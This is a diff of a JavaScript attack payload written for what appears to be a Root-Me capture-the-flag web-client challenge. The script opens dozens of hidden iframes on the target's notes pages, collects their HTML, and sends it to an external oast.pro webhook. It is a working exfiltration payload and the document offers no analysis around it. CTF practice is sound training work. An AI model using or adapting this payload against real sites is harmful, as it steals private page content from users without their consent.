@@ -1,9 +1,9 @@
 <script>
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
-
 async function run(a = 0, b = 50) {
     const promises = [];
+    const iframeContents = [];
 
     for (let i = a; i < b; i++) {
         const iframe = document.createElement("iframe");
@@ -11,21 +11,30 @@ async function run(a = 0, b = 50) {
         iframe.style.display = "none";
         document.documentElement.appendChild(iframe);
 
-        const p = new Promise(resolve => {
-            iframe.onload = () => resolve();
-        });
-
-        promises.push(p);
+        promises.push(new Promise(resolve => {
+            iframe.onload = () => {
+                try {
+                    iframeContents.push({
+                        id: i,
+                        content: iframe.contentDocument.documentElement.outerHTML
+                    });
+                } catch (e) {
+                    iframeContents.push({id: i, content: ""});
+                }
+                resolve();
+            };
+        }));
     }
 
     await Promise.all(promises);
 
-    const data = encodeURIComponent(document.documentElement.outerHTML);
-    
-    const iframe = document.createElement("iframe");
-    iframe.src = WEBHOOK + "?d=" + encodeURIComponent(data);        
-    document.documentElement.appendChild(iframe);
+    // send the collected iframe contents
+    const data = encodeURIComponent(JSON.stringify(iframeContents));
+    const webhookIframe = document.createElement("iframe");
+    webhookIframe.src = WEBHOOK + "?d=" + data;
+    document.documentElement.appendChild(webhookIframe);
 }
+
 
 run();
 </script>
